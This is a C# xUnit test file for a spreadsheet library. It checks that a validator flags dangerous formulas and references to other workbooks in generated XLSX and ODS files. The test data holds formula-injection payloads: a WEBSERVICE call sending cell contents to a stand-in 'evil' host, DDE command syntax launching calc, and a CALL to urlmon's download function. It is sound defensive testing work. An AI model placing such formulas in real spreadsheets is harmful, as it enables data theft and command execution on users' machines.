using OoxSpreadsheet;
using OslSpreadsheet.Models;
using OslSpreadsheet.Services;
using OslSpreadsheet.Validation;
using Xunit;

namespace OslSpreadsheet.Tests;

/// <summary>
/// Tests for detection of formulas that reach outside the spreadsheet (data exfiltration, link opening, code execution)
/// and references into other workbooks.
/// </summary>
public class FormulaSafetyTests
{
    /// <summary>
    /// Dangerous functions and DDE syntax are detected regardless of case and spacing.
    /// </summary>
    [Theory]
    [InlineData("=WEBSERVICE(\"http://evil/?d=\"&A1)")]
    [InlineData("=webservice(A1)")]
    [InlineData("=HYPERLINK(\"http://evil\",\"click\")")]
    [InlineData("=IF(TRUE, HYPERLINK (\"x\"), 1)")]
    [InlineData("=RTD(\"prog\",,\"topic\")")]
    [InlineData("=cmd|'/c calc'!A0")]
    [InlineData("=IMPORTXML(\"http://evil\",\"//a\")")]
    [InlineData("=CALL(\"urlmon\",\"URLDownloadToFileA\")")]
    [InlineData("=DDE(\"soffice\";\".\";\"x\")")]
    public void FindDangerousConstruct_DetectsDangerousFormulas(string formula)
    {
        Assert.NotNull(FormulaTranslator.FindDangerousConstruct(formula));
    }

    /// <summary>
    /// Ordinary formulas, names that merely contain a dangerous name, and dangerous names inside string literals are not flagged.
    /// </summary>
    [Theory]
    [InlineData("=SUM(A1:A10)")]
    [InlineData("=IF(A1>50,\"big\",\"small\")")]
    [InlineData("=\"WEBSERVICE(\"&A1")]
    [InlineData("=\"=cmd|'/c calc'!A0\"")]
    [InlineData("=MYHYPERLINK(A1)")]
    [InlineData("=HYPERLINKS")]
    [InlineData("='My|Sheet'!A1")]
    [InlineData("=ROUND(AVERAGE('My Data'!A1:A3),1)")]
    public void FindDangerousConstruct_IgnoresSafeFormulas(string formula)
    {
        Assert.Null(FormulaTranslator.FindDangerousConstruct(formula));
    }

    /// <summary>
    /// References to other workbooks are recognized; ordinary and quoted sheet references are not.
    /// </summary>
    [Theory]
    [InlineData("=[1]Sheet1!A1", true)]
    [InlineData("='C:\\Reports\\[Budget.xlsx]Sheet1'!A1", true)]
    [InlineData("=SUM('My Data'!A1:A3)", false)]
    [InlineData("=Sheet2!B2*2", false)]
    public void HasExternalReference_DetectsOtherWorkbooks(string formula, bool expected)
    {
        Assert.Equal(expected, FormulaTranslator.HasExternalReference(formula));
    }

    /// <summary>
    /// Validate() warns by default, and the option turns the warning into an error that stops generation.
    /// </summary>
    [Fact]
    public async Task WorkbookValidate_WarnsByDefault_ErrorsWithOption()
    {
        using var spreadsheet = new Spreadsheet();
        var cell = spreadsheet.Workbook.AddSheet("Calc").AddCell(2, 2);
        cell.Formula = "=WEBSERVICE(\"http://evil/?d=\"&A1)";

        var result = spreadsheet.Workbook.Validate();
        Assert.True(result.IsValid);
        var warning = Assert.Single(result.Warnings);
        Assert.Equal("WB_FORMULA_DANGEROUS", warning.Code);
        Assert.Equal("B2", warning.Cell);
        Assert.Contains("WEBSERVICE()", warning.Message);

        var strict = spreadsheet.Workbook.Validate(ValidationFileFormat.Xlsx, new ValidationOptions { TreatDangerousFormulasAsErrors = true });
        Assert.False(strict.IsValid);
        Assert.Equal("WB_FORMULA_DANGEROUS", Assert.Single(strict.Errors).Code);

        // Generation uses default options, so a warning does not block it
        Assert.NotEmpty(await spreadsheet.GenerateXlsxFileAsync());
    }

    /// <summary>
    /// External workbook references are warnings on the workbook, and never errors.
    /// </summary>
    [Fact]
    public void WorkbookValidate_ExternalReference_IsWarning()
    {
        var workbook = new oWorkbook();
        workbook.AddSheet("Calc").AddCell(1, 1).Formula = "=[1]Budget!A1";

        var result = workbook.Validate(ValidationFileFormat.Ods, new ValidationOptions { TreatDangerousFormulasAsErrors = true });

        Assert.True(result.IsValid);
        Assert.Equal("WB_FORMULA_EXTERNAL_REFERENCE", Assert.Single(result.Warnings).Code);
    }

    /// <summary>
    /// The file validators report dangerous formulas in generated XLSX and ODS files, honoring the option.
    /// </summary>
    [Fact]
    public async Task FileValidators_ReportDangerousFormulas()
    {
        using var spreadsheet = new Spreadsheet();
        var sheet = spreadsheet.Workbook.AddSheet("Calc");
        sheet.AddCell(1, 1, "x");
        sheet.AddCell(2, 1).Formula = "=HYPERLINK(\"http://evil\",\"click\")";
        var xlsx = await spreadsheet.GenerateXlsxFileAsync();
        var ods = await spreadsheet.GenerateOdsFileAsync();

        var xlsxResult = SpreadsheetValidator.ValidateXlsx(xlsx);
        var odsResult = SpreadsheetValidator.ValidateOds(ods);

        foreach (var (result, code) in new[] { (xlsxResult, "XLSX_FORMULA_DANGEROUS"), (odsResult, "ODS_FORMULA_DANGEROUS") })
        {
            Assert.True(result.IsValid, result.ToString());
            var issue = Assert.Single(result.Issues);
            Assert.Equal(code, issue.Code);
            Assert.Equal(ValidationSeverity.Warning, issue.Severity);
            Assert.Equal("Calc", issue.Sheet);
            Assert.Equal("A2", issue.Cell);
        }

        var strict = new ValidationOptions { TreatDangerousFormulasAsErrors = true };
        Assert.False(SpreadsheetValidator.ValidateXlsx(xlsx, strict).IsValid);
        Assert.False(SpreadsheetValidator.ValidateOds(ods, strict).IsValid);
    }

    /// <summary>
    /// DDE syntax in an XLSX file is reported even though no function name is involved.
    /// </summary>
    [Fact]
    public async Task FileValidator_ReportsDdeSyntax()
    {
        using var spreadsheet = new Spreadsheet();
        spreadsheet.Workbook.AddSheet("Calc").AddCell(1, 1).Formula = "=cmd|'/c calc'!A0";

        var result = SpreadsheetValidator.ValidateXlsx(await spreadsheet.GenerateXlsxFileAsync());

        var issue = Assert.Single(result.Issues, i => i.Code == "XLSX_FORMULA_DANGEROUS");
        Assert.Contains("DDE", issue.Message);
    }
}
